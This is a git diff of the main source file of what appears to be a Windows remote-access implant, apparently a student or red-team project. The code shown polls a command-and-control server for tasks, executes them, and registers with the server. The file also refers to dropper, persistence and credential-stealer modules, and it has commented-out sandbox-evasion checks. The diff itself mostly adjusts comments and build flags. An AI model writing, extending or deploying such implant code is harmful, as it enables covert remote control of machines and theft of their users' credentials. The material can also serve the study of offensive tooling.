@@ -1,18 +1,5 @@
 #include "implant.h"
-// x86_64-w64-mingw32-g++ implant.cpp execute/execute.cpp dropper/Dropper.cpp file/file.cpp http/http.cpp persist/persist.cpp situational_awareness/GatherInfo.cpp stealer/aes_gcm.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/stealer.cpp -lshlwapi -lurlmon -lwininet -lwinhttp  -lbcrypt -lcrypt32 -luserenv -static -o implant.exe   
-/*
-Notes: GatherInfo - 
-[Currently has Computer name, username, and privileges]
-Read the environment variables
-● List the computer’s network interfaces
-    ○  MAC, IPs, interface names…etc
-● Get the windows version
-● Get the current username and token
-● Get the Machine GUID
-● List files in a directory
-● Change Directory
-● List all running processes 
-*/
+// x86_64-w64-mingw32-g++ implant.cpp execute/execute.cpp dropper/Dropper.cpp file/file.cpp http/http.cpp persist/persist.cpp situational_awareness/GatherInfo.cpp stealer/aes_gcm.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/stealer.cpp -liphlpapi -lshlwapi -lurlmon -lwininet -lwinhttp  -lbcrypt -lcrypt32 -luserenv -static -o implant.exe   
 
 /* To Implement:
 A way to have the binary only run 3
@@ -21,15 +8,6 @@ A way to have the binary only run 3
 The encryption that we had
 */
 
-/* Double Check with Ingi -
-Can the table be for get_commands [ I think args is not in there]
-            { "task_id": 12,
-            "target_implant_id": 1,
-            "command": "whoami",
-            "args": "",
-            "created_on": "dec 01",
-            "status": "done"}
- */
 
 /*
 This was under execution - idk what it is
@@ -64,11 +42,12 @@ Expected Check in: When should you expect to see the agent again?
 
 void IWillRunForever(void){
     while(true){
+
         /* THIS IS GETTING US COMMANDS EVERY MINUTE */
-		
 		std::string new_item = HttpGetCommand("/get_commands", IMPLANT_ID);
         json converted_new_item = json::parse(new_item);
         int num_of_tasks = converted_new_item.size();
+
         for(int i = 0; i < num_of_tasks; i++){
             /* Only execute commands that are untouched */
             std::string line = converted_new_item.at(i).at(2);
@@ -80,15 +59,19 @@ void IWillRunForever(void){
 			ss >> command;
 			ss >> args;
       
-
+			/* Calling Execute - Sending Command, Args, Task_ID, Implant_ID */
             execute(command, args, converted_new_item.at(i).at(0), IMPLANT_ID);
         }
+
+		/* Shortened Sleep to be able to test more efficiently */
         Sleep(10000);  
         //Sleep(60000);
     }
 }
 
 void registerimplant(void){
+
+	/* This has yet to be Tested - Currently receives a 500 error */
     std::string jitter = std::to_string(5);
     std::string sleep = std::to_string(60000);
     HttpRegisterImplant("/register_implant", jitter, sleep);
@@ -98,12 +81,12 @@ void registerimplant(void){
 int main(int argc, char* argv[]){
 
     /* Registering Implant */
-    registerimplant();
+    //registerimplant();
 
     /* HOW ARE WE GETTING IMPLANT ID?*/
 
     /* Sandbox Detection */
-    printf("Executing Sandbox Detection\n");
+    // printf("Executing Sandbox Detection\n");
     // if (vmCheck() || vmDriverCheck() || sandboxTimeCheck()) {
     //     exit(0);
     // }
